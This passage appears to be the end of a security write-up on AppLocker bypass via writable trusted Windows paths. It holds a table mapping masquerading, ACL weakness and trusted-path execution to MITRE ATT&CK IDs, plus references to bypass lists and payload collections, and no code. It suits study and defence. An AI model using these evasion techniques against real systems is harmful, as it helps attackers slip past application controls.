| Masquerading | T1036 | Naming payloads after legitimate Windows binaries |
| File System Permissions Weakness | T1574.010 | Exploiting overly-permissive ACLs in trusted paths |
| Defense Evasion via Trusted Path | T1218 | Executing from AppLocker-whitelisted directory |

---

## References

- [MITRE ATT&CK T1574 — Hijack Execution Flow](https://attack.mitre.org/techniques/T1574/)
- [MITRE ATT&CK T1574.001 — DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001/)
- Oddvar Moe — writable Windows path research
- [LOLBAS Project](https://lolbas-project.github.io/)
- [api0cradle — UltimateAppLockerByPassList](https://github.com/api0cradle/UltimateAppLockerByPassList)
- Microsoft Docs — AppLocker Path Rules
- [PayloadsAllTheThings — AppLocker Bypass](https://github.com/swisskyrepo/PayloadsAllTheThings)
